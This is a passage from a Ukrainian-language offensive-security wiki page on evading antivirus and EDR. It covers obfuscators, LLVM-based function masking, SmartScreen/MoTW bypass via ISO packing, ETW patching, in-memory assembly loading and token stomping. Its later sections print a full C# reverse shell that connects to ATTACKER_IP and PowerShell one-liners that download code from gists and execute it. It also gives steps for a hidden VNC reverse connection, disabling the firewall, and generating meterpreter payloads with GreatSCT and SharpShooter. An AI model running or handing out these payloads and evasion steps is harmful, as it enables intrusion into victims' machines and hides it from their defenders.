Цей ланцюжок відновлює потік виконання **без** запуску шкідливого зразка — це корисно під час роботи на ізольованій робочій станції.

> 🛈  ConfuserEx створює користувацький атрибут `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного сортування зразків.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: обфускатор C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати форк набору засобів компіляції [LLVM](http://www.llvm.org/) з відкритим кодом, який забезпечує вищий рівень безпеки програмного забезпечення за допомогою [обфускації коду](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захисту від підміни.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як за допомогою мови `C++11/14` генерувати обфускований код під час компіляції без використання зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає рівень обфускованих операцій, згенерованих засобами метапрограмування шаблонів C++, що трохи ускладнює життя тому, хто хоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це обфускатор бінарних файлів x64, здатний обфускувати різні PE-файли, зокрема .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий рушій метаморфного коду для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це фреймворк для дрібнозернистої обфускації коду мов, підтримуваних LLVM, із використанням ROP (return-oriented programming). ROPfuscator обфускує програму на рівні асемблерного коду, перетворюючи звичайні інструкції на ROP-ланцюжки та руйнуючи звичне уявлення про нормальний потік керування.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor може перетворювати наявні EXE/DLL на shellcode, а потім завантажувати їх

### Самомаскування кожної функції за допомогою компілятора LLVM

Замість того, щоб маскувати весь implant лише під час простою, модифікований бекенд LLVM X86 може підтримувати вибрані функції в XOR-маскованому стані, коли вони неактивні. PoC Function Peekaboo вибирає демангльовані імена, що містять `REG_`, вставляє position-independent заглушки входу/виходу навколо фінального машинного коду та розміщує один спільний обробник маскування в `.text`; сигнатури на рівні вихідного коду та угода викликів Windows x64 залишаються незмінними.<sup>[[38]](#references)[[39]](#references)</sup>

#### Перетворення потоку керування в бекенді

Це слід робити після вибору інструкцій і оптимізації, оскільки перетворення має охоплювати **кожну згенеровану інструкцію return** і враховувати точне розташування інструкцій x86. `MachineFunctionPass`, що працює перед генерацією коду, знаходить останній `MachineInstr::isReturn()`, видаляє його, щоб останній шлях переходив до доданого епілогу, а попередні інструкції return замінює на `JMP_1 handler`. Зберігайте будь-яке згенероване компілятором очищення стека/кадру перед кожною інструкцією return; перенаправляйте лише саму інструкцію return.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` і `X86AsmPrinter::emitFunctionBodyEnd()` генерують заглушки для кожної функції, а `emitEndOfAsmFile()` — обробник. Спільні між етапами генерації символи дають змогу переходу в прологу вести до епілогу, який буде згенеровано пізніше; для вручну згенерованої near-інструкції `je` виведіть `0F 84`, а потім чотирибайтовий MC-вираз `target - address_after_je`. Виклики та переходи до обробника можна натомість згенерувати як об’єкти `MCInst` (`CALL64pcrel32` і `JMP_1`). Якщо pass нічого не змінював, для невибраної функції він має повертати `false`; у PoC помилково повертається `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Метадані та ініціалізація до CRT

PoC розміщує XOR-ключ і записи розміром 16 байтів, що містять переміщений завантажувачем вказівник на функцію та довжину, визначену під час виконання, у `.funcmeta`. Хоча поле C має тип `uint32_t`, обробник зчитує QWORD зі зміщенням `+8` у записі, захоплюючи довжину та її доповнення, і переходить до наступного запису на `0x10` байтів. Імена секцій PE мають довжину лише вісім байтів, тому під час пошуку в рантаймі використовується `.funcmet`. Зовнішній патчер додає виконувану секцію `.stub`, зберігає старий RVA точки входу в заглушці та перенаправляє `AddressOfEntryPoint`; PIC-заглушка отримує базу образу через `gs:[0x60]` → `[PEB+0x10]`, проходить по імпортах PE32+, щоб знайти вже імпортовану `VirtualProtect`, і виконується до CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Під час ініціалізації в `gs:[0xE8]` встановлюється маркер, після чого викликається кожна функція з метаданих. Незмінюваний пролог записує адресу початку функції в `gs:[0xF0]`, виявляє маркер і пропускає ще не замасковане тіло. Потім епілог викликає `handler`; після збереження обробником 13 регістрів (`0x68` байтів) адреса повернення в `[rsp+0x68]` вказує на кінець перетвореної функції, тож `end - start` можна записати в її запис метаданих. Після маскування всіх тіл заглушка скидає маркер і переходить до `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Під час звичайного виклику пролог викликає той самий симетричний обробник, щоб декодувати тіло. Останній шлях переходить до доданого епілогу, тоді як кожен попередній return переходить безпосередньо до спільного обробника. Звичайний епілог також використовує `jmp handler`, а не `call`, тож після повторного маскування `ret` обробника використовує адресу повернення початкового виклику, зберігаючи результат функції в `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Примітив маскування та індикатори аналізу

Обробник знаходить поточний запис, пропускає фіксований видимий пролог (у цій збірці — `0x46` байтів), змінює захист решти ділянки на `PAGE_EXECUTE_READWRITE`, виконує побайтову операцію XOR з молодшим байтом ключа, а потім встановлює захист `PAGE_EXECUTE_READ`. Отже, той самий цикл декодує тіло під час входу та кодує його під час кожного звичайного виходу.<sup>[[38]](#references)[[39]](#references)</sup>

До виразних індикаторів цієї схеми належать:<sup>[[38]](#references)[[39]](#references)</sup>

- точка входу всередині виконуваної секції `.stub` і секція `.funcmet`, що містить ключ і переміщені вказівники на `.text`;
- розбір PEB, таблиці імпортів і таблиці секцій до CRT, за яким ідуть виклики через кожен вказівник із метаданих;
- однакові PIC-прологи `call`/`pop` і численні точки повернення, перенаправлені до одного обробника;
- запис у `gs:[0xE8]`, `gs:[0xF0]` і `gs:[0xF8]`, після якого відбуваються повторювані зміни захисту через `VirtualProtect` і побайтові XOR-записи в виконувані сторінки, прив’язані до образу.

Це спосіб ухилення від сканерів пам’яті, а не криптографічний захист: пропатчений файл усе ще містить початкове незашифроване тіло, а налагоджувач може встановити breakpoint на `VirtualProtect` або цикл XOR і зняти дамп активної функції. Однобайтовий XOR, читабельні метадані та фіксована межа `0x46` також спрощують відновлення офлайн.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Слоти TEB у PoC є локальними для потоку, але змінені сторінки коду спільні для всього процесу. Тому паралельний або рекурсивний вхід може перемикати інструкції, поки виконується інший виклик; винятки та нелокальні виходи також можуть обійти повторне маскування. Надійна реалізація має синхронізувати переходи, відновлювати фактичний захист, повернутий через `lpflOldProtect`, уникати жорстко заданої довжини заглушки, перевіряти вирівнювання стека x64 для обох шляхів `call` і `jmp`, а також викликати `FlushInstructionCache` після перезапису виконуваних байтів. Microsoft прямо покладає на викликачів відповідальність за узгодженість кешу інструкцій під час модифікації виконуваного коду.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Можливо, ви бачили цей екран під час завантаження деяких виконуваних файлів з інтернету та їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, призначений захищати кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно працює на основі репутації: застосунки, які завантажують нечасто, викликають спрацювання SmartScreen, що попереджає кінцевого користувача та не дає йому запустити файл (хоча файл усе ще можна запустити, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету разом із URL-адресою, звідки їх було завантажено.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка ADS Zone.Identifier для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не викликають SmartScreen**.

Дуже ефективний спосіб не допустити отримання вашими payload позначки Mark of The Web — запакувати їх у контейнер, наприклад ISO. Це працює, оскільки Mark-of-the-Web (MOTW) **не можна** застосувати до томів **не NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це інструмент, який пакує payload у вихідні контейнери, щоб обійти Mark-of-the-Web.

Приклад використання:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ось демонстрація обходу SmartScreen: payloads пакуються в ISO-файли за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм журналювання у Windows, який дає змогу програмам і системним компонентам **записувати події**. Однак його також можуть використовувати продукти безпеки для моніторингу та виявлення шкідливої активності.

Подібно до вимкнення (обходу) AMSI, можна також зробити так, щоб функція **`EtwEventWrite`** процесу в user space одразу повертала керування, не записуючи жодних подій. Для цього функцію патчать у пам’яті, щоб вона одразу повертала керування, фактично вимикаючи журналювання ETW для цього процесу.

Детальніше можна дізнатися тут: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) і [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Рефлексія C#-збірок

Завантаження C#-бінарних файлів у пам’ять відоме вже досить давно і досі є чудовим способом запускати свої post-exploitation інструменти, не потрапляючи на очі AV.

Оскільки payload завантажується безпосередньо в пам’ять, не торкаючись диска, нам потрібно лише подбати про патчинг AMSI для всього процесу.

Більшість C2-фреймворків (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) уже дають змогу виконувати C#-збірки безпосередньо в пам’яті, але є різні способи це зробити:

- **Fork\&Run**

Цей спосіб передбачає **створення нового процесу-приманки**, ін’єкцію у нього свого шкідливого post-exploitation коду, його виконання, а після завершення — знищення нового процесу. У цього способу є як переваги, так і недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **поза** процесом нашого Beacon implant. Це означає, що якщо під час post-exploitation дій щось піде не так або нас виявлять, **імовірність** того, що наш **implant виживе, буде значно вищою**. Недолік полягає в тому, що **імовірність** бути виявленим засобами **поведінкового виявлення** буде вищою.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Цей спосіб передбачає ін’єкцію шкідливого post-exploitation коду **у власний процес**. Так можна не створювати новий процес, який просканує AV, але якщо під час виконання payload щось піде не так, **імовірність втратити свій beacon буде значно вищою**, оскільки він може аварійно завершити роботу.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Щоб дізнатися більше про завантаження C#-збірок, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Також можна завантажувати C#-збірки **з PowerShell**. Перегляньте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Перепакування .NET-інструментів у NativeAOT WebAssembly (WasmForge)

Звичайні методи `execute-assembly` зберігають впізнаваний MSIL і зрештою ініціалізують CLR. **WasmForge** змінює середовище виконання: переносить C#-проєкт на експериментальну ціль NativeAOT-LLVM WASI, заздалегідь компілює його у WebAssembly і вбудовує цей модуль у Windows PE-хост на основі Wazero. Отриманому процесу не потрібні CLR, JIT або хост `dotnet` на цільовій системі, тож правила, засновані лише на назвах керованих збірок, завантаженні CLR, AMSI або .NET ETW, втрачають прямий доступ до цих подій. Це техніка обходу виявлення та пакування, а не обхід межі привілеїв — гостьове середовище зберігає дозволи оригінального інструмента та його спостережувану поведінку в ОС.<sup>[[44]](#references)[[45]](#references)</sup>

### Збирання C#-проєкту

Рекомендований спосіб збирання — Docker-середовище проєкту, оскільки воно містить .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, компонувальник і залежності для підписування. Файл `.csproj` визначається автоматично; одноетапне збирання виконує міграцію, патчинг сумісності, компіляцію WASM, створення PE та підписування.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Для усунення проблем або перевірки згенерованого коду розбийте процес на `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` і фінальну команду `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. У середовищі збірки також використовується обгортка `wasm-component-ld`, яка дає змогу уникнути кодування компонентів WASI Preview 2 і створити звичайний модуль, очікуваний вбудованим runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Зв'язування wasm32 C# із x64 Win32

Це не прозора перекомпіляція. NativeAOT-WASI не підтримує деякі функції BCL, орієнтовані на Windows, або змінює їхню поведінку, а гість wasm32 зазвичай виділяє чотирибайтові слоти для вказівників, тоді як API x64 можуть повертати восьмибайтові вказівники. WasmForge розв'язує обидві проблеми за допомогою таких згенерованих шарів:<sup>[[44]](#references)</sup>

1. Патчер вихідного коду виправляє специфічні для AOT семантичні відмінності та перенаправляє непідтримувані виклики реєстру, каналів, WMI, ідентифікації, служб каталогів, версій файлів, LSA та подібні виклики до помічників `Wf*`.
2. Сканер P/Invoke генерує зіставлення NativeAOT `DirectPInvoke`, щоб виклики `[DllImport]` прив'язувалися до пов'язаних символів мосту C, а не завантажували динамічно оголошену DLL усередині гостя.
3. Вказівники, що передаються хосту, мають тип `ulong` у C# і `uint64_t` у C. Універсальний диспетчер передає виклик обробнику Win32 на хості; `out8_mask` позначає справжні восьмибайтові вихідні слоти, старші половини яких потрібно зберегти. Для непозначених вихідних даних у форматі wasm32 використовується захист зі знімком і відновленням, щоб запис x64 не пошкодив сусідні чотири байти.
4. Спеціалізовані мости хоста обробляють операції, які не підходять для універсальної диспетчеризації системних викликів, наприклад доступ до кешу квитків LSA, операції Kerberos/BCrypt зі структурованими результатами, трафік TCP KDC і запити LDAP.

Наприклад, обгортка для `version.dll!VerQueryValueW` передає чотири адреси хоста та встановлює біти 2 і 3 (`0xC`), оскільки вказівник на значення та довжина займають восьмибайтові вихідні слоти. Сама обгортка залишається універсальною й передає назву DLL, назву експорту, аргументи та маску до `wf_call_v2`; хост виконує перетворення вказівників і викликає нативний API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Обмеження та точки зміщення виявлення

Код із великою кількістю reflection, динамічне завантаження збірок, довільні native callbacks і складні структури x64, що повертаються в пам’ять WASM, усе ще можуть потребувати окремих патчів для кожного інструмента або взагалі не працювати. Універсальні сокети WASI Preview 2 також можуть викликати заглушки no-op, тому підтримувані інструменти використовують host shim для конкретних протоколів. Перевіряйте кожну команду порівняно з нативною збіркою, а не виходьте з припущення про паритет функцій.<sup>[[44]](#references)[[45]](#references)</sup>

Цей підхід зміщує телеметрію, а не робить payload невидимим. Виявлення може зосередитися на PE-файлі, що містить або створює модуль WASM, поведінці runtime на кшталт Wazero, незвичному виділенні й копіюванні пам’яті host/guest, універсальній прямій диспетчеризації Win32, аномаліях підпису та ресурсів PE, а також на подальших викликах API і мережевому трафіку. Тому відсутність подій CLR-load, AMSI або .NET ETW не слід вважати доказом того, що процес безпечний.<sup>[[44]](#references)</sup>

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можна виконувати шкідливий код іншими мовами, надавши скомпрометованій машині доступ **до середовища інтерпретатора, встановленого на SMB-шарі під контролем атакувальника**.

Надавши доступ до бінарних файлів інтерпретаторів і середовища на SMB-шарі, ви можете **виконувати довільний код цими мовами в пам’яті** скомпрометованої машини.

У репозиторії зазначено: Defender усе ще сканує скрипти, але використання Go, Java, PHP тощо дає **більше гнучкості для обходу статичних сигнатур**. Тестування випадкових необфускованих скриптів reverse shell цими мовами виявилося успішним.

## Розміщення WebAssembly для обходу статичного аналізу

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping змінює access token засобу захисту, як-от EDR або AV. Зменшення привілеїв токена може залишити процес запущеним, але не дозволити йому виконувати привілейовану перевірку чи виправлення.

Щоб запобігти цьому, Windows могла б **не дозволяти зовнішнім процесам** отримувати handles до токенів процесів засобів захисту.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного ПЗ

### Chrome Remote Desktop

Як описано в [**цій публікації блогу**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), достатньо розгорнути Chrome Remote Desktop на ПК жертви, а потім використати його, щоб отримати контроль і забезпечити persistence:<sup>[[35]](#references)</sup>
1. Завантажте програму з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім — файл MSI для Windows.
2. Запустіть інсталятор у тихому режимі на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть «Далі». Майстер попросить вас авторизуватися; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте надану команду, внісши потрібні зміни: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` задає PIN без використання GUI).


## Розширений обхід виявлення

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Обхід виявлення — дуже складна тема. Іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тому в зрілих середовищах практично неможливо залишатися повністю непоміченим.

Кожне середовище, з яким ви матимете справу, матиме свої сильні та слабкі сторони.

Наполегливо раджу переглянути цю доповідь [@ATTL4S](https://twitter.com/DaniLJ94), щоб ознайомитися з більш просунутими техніками обходу виявлення.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це ще одна чудова доповідь [@mariuszbit](https://twitter.com/mariuszbit) про багаторівневий обхід виявлення.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі техніки**

### **Перевірка, які частини Defender вважає шкідливими**

Можна скористатися [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини бінарного файла**, доки **не виявить, яку саме частину Defender** вважає шкідливою, і покаже її вам.\
Інший інструмент, що робить **те саме, —** [**avred**](https://github.com/dobin/avred), який пропонує цю послугу у відкритому вебінтерфейсі за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet-сервер**

До Windows 10 усі версії Windows постачалися з **Telnet-сервером**, який можна було встановити (від імені адміністратора), виконавши:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Налаштуйте його так, щоб він **запускався** під час запуску системи, і **запустіть** його зараз:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Змінити порт telnet** (непомітно) та вимкнути брандмауер:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Завантажте його звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні завантаження bin, а не setup)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть параметр _Disable TrayIcon_
- Установіть пароль у _VNC Password_
- Установіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **машину жертви**

#### **Зворотне підключення**

**Атакувальник** має **запустити на своєму** **хості** бінарний файл `vncviewer.exe -listen 5900`, щоб бути **готовим** прийняти зворотне **VNC-підключення**. Потім на **машині жертви** запустіть демон winvnc командою `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**УВАГА:** Щоб зберегти прихованість, не можна робити кілька речей

- Не запускайте `winvnc`, якщо він уже працює, інакше з’явиться [спливаюче вікно](https://i.imgur.com/1SROTTl.png). Перевірте, чи він працює, командою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій самій директорії, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для перегляду довідки, інакше з’явиться [спливаюче вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте його звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

У GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Поточний захисник дуже швидко завершить процес.**

### Компілюємо власний reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Компілюйте його за допомогою:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Використовуйте це з:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# із використанням компілятора

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список C#-обфускаторів: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Приклад використання Python для створення інжекторів:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – знищення AV/EDR із простору ядра

